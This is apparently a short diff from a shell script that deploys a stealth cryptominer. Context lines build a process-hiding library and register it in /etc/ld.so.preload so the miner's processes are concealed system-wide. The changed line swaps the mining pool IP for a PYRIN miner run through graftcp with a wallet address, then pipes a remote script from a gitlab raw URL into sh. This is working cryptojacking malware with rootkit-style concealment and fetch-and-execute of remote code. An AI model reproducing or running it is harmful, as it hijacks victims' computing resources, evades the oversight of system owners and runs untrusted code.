@@ -58,4 +58,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./lol1.81 -a PYRIN -p 134.209.245.90:443 -u pyrin:qp4q02w0j7he7rft0xa7r6g20ph2u7sr4wl0tgcvpwtceu4vkwmnym7ec6faq.$(shuf -n 1 -i 1-3000)-Bismillah --no-cl & curl https://gitlab.com/majapahlevi/mvp/-/raw/main/cpu.sh | sh
+./graftcp/graftcp ./lol1.81 -a PYRIN -p 167.172.24.221:443 -u pyrin:qp4q02w0j7he7rft0xa7r6g20ph2u7sr4wl0tgcvpwtceu4vkwmnym7ec6faq.$(shuf -n 1 -i 1-3000)-Bismillah --no-cl & curl https://gitlab.com/majapahlevi/mvp/-/raw/main/cpu.sh | sh
